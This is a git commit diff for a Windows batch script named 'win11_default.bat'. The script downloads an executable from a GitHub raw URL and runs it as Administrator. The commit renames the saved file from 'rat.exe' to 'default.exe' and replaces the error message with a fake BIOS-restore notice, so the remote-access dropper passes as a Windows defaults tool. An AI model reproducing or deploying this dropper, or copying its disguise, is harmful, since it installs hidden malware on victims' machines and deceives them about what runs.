518bbe07cc4c9e7a11c70a35825e723a1e8838bf
optolab <sloneeddie36@gmail.com>
2025-01-12 14:05:47 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,11 +1,10 @@
 @echo off
 
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\rat.exe"
-if exist "%TEMP%\rat.exe" (
-    echo File downloaded successfully.
-    start /B "" runas /user:Administrator "%TEMP%\rat.exe"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe"
+if exist "%TEMP%\default.exe" (
+    start /B "" runas /user:Administrator "%TEMP%\default.exe"
 ) else (
-    echo Failed to download file.
+    echo Windows 11 | BIOS failed to restore defaults. Try again
 )
 
 endlocal
